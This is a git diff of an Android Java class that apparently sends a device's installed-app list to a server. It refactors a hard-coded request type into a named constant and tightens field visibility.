@@ -20,6 +20,7 @@ import android.graphics.drawable.Drawable;
 import android.preference.PreferenceManager;
 import android.util.Base64;
 
+import com.inet.android.request.ConstantRequest;
 import com.inet.android.request.RequestList;
 import com.inet.android.utils.Logging;
 /**
@@ -30,11 +31,10 @@ import com.inet.android.utils.Logging;
  */
 @SuppressLint("NewApi")
 public class ListApp {
-	Context mContext;
-	private String iType = "4";
+	private Context mContext;
 	private String complete;
 	private static String LOG_TAG = ListApp.class.getSimpleName().toString();
-	final int COMPRESSION_QUALITY = 100;
+	private final int COMPRESSION_QUALITY = 100;
 	private String version;
 		
 	/**
@@ -129,7 +129,7 @@ public class ListApp {
 				sendStr = null;
 			}
 		} else {
-			TurnSendList.setList(iType, version, "0",mContext);
+			TurnSendList.setList(ConstantRequest.TYPE_LIST_APP_REQUEST, version, "0",mContext);
 		}
 	}
 
@@ -140,6 +140,6 @@ public class ListApp {
 	}
 
 	private void sendRequest(String str, String complete) {
-			RequestList.sendDemandRequest(str, iType, complete, version, mContext);
+			RequestList.sendDemandRequest(str, ConstantRequest.TYPE_LIST_APP_REQUEST, complete, version, mContext);
 	}
 }
